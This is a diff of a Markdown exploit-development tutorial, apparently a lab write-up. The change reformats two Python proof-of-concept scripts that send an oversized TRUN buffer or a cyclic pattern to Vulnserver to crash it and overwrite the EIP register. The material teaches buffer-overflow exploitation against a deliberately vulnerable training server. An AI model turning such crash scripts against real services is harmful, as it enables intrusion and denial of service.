@@ -12,24 +12,23 @@ classes: wide
 Begin by using the below proof of concept script, developed by using the SPIKE fuzzer to identify a hole in the Vulnserver TRUN command.
 
 Vulnserver TRUN Python Script: POC
+```py
+#!/usr/bin/python
+import socket
+import os
+import sys
 
-		```py
-    #!/usr/bin/python
-		import socket
-		import os
-		import sys
+crash="A"*5000
 
-		crash="A"*5000
+buffer="TRUN /.:/"
+buffer+=crash
 
-		buffer="TRUN /.:/"
-		buffer+=crash
-
-		print "[*] Sending evil TRUN request to VulnServer, OS-42279"
-		expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
-		expl.connect(("192.168.83.128", 9999))
-		expl.send(buffer)
-    expl.close()
-    ```
+print "[*] Sending evil TRUN request to VulnServer, OS-42279"
+expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+expl.connect(("192.168.83.128", 9999))
+expl.send(buffer)
+expl.close()
+```
 
 Running this POC script against Vulnserver produces the same result in the OllyDbg debugger as our previous SPIKE fuzzing attempts. As a very nice bonus, the input we sent has been used to control the value of a very important register in the CPU – the EIP (Extended Instruction Pointer) register. Notice how the EIP register contains the value 41414141?
 
@@ -41,24 +40,23 @@ Additional testing proves that a 2500 byte buffer will also cause the Vulnserver
 Insert the 2500 character pattern into the Vulnserver TRUN POC Python Script.
 
 Vulnserver TRUN Python Script: Pattern
+```py
+#!/usr/bin/python
+import socket
+import os
+import sys
 
-    ```py
-    #!/usr/bin/python
-    import socket
-    import os
-    import sys
+crash="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3>
 
-    crash="Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3>
+buffer="TRUN /.:/"
+buffer+=crash
 
-    buffer="TRUN /.:/"
-    buffer+=crash
-
-    print "Sending evil TRUN request to VulnServer, OS-42279"
-    expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
-    expl.connect(("192.168.83.128", 9999))
-    expl.send(buffer)
-    expl.close()
-    ```
+print "Sending evil TRUN request to VulnServer, OS-42279"
+expl = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
+expl.connect(("192.168.83.128", 9999))
+expl.send(buffer)
+expl.close()
+```
 
 Running the Vulnserver TRUN Pattern Python Script against the target system shows that the following pattern value is being stored in EIP.
 
